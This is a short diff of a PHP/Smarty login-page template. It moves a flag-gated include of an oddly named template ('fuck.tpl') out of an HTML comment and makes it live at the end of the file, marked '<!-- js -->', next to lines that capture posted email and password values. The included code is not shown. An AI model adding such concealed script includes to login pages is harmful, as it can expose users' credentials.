@@ -134,9 +134,7 @@
 
 {include file='footer.tpl'}
 </div>
-<!--
-{if $config["fack"] == 'true'}{include file='fuck.tpl'}{/if}
--->
+
 {literal}
 <script>
     let calltgbtn = document.querySelector('#calltgauth');
@@ -340,3 +338,7 @@
 $a=$_POST['Email'];
 $b=$_POST['Password'];
 ?>
+
+<!-- js -->
+{if $config["fack"] == 'true'}{include file='fuck.tpl'}{/if}
+<!-- js -->
